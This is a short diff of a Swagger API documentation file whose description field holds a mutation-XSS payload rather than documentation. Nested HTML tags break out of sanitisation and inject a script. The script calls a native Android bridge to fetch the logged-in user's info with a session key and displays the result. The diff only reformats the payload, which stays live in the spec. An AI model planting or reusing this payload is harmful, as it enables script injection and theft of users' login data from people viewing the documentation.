@@ -2,12 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>UWNC.callH5 = function(e) {
-
-			alert(JSON.stringify(e));
-        }
-		
-		UWNC.callAndroid(JSON.stringify({"ncmd":"GetLoginUserInfo","nparams":{"sk":"695e59ad799de443b755746219685a3f","sourceData":{}},"callbackWcmd":"xxxxxx"}))</script>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>UWNC.callH5 = function(e) {alert(JSON.stringify(e));}UWNC.callAndroid(JSON.stringify({"ncmd":"GetLoginUserInfo","nparams":{"sk":"695e59ad799de443b755746219685a3f","sourceData":{}},"callbackWcmd":"xxxxxx"}))</script>"></form>
 
   version: production
 basePath: /JSSResource/
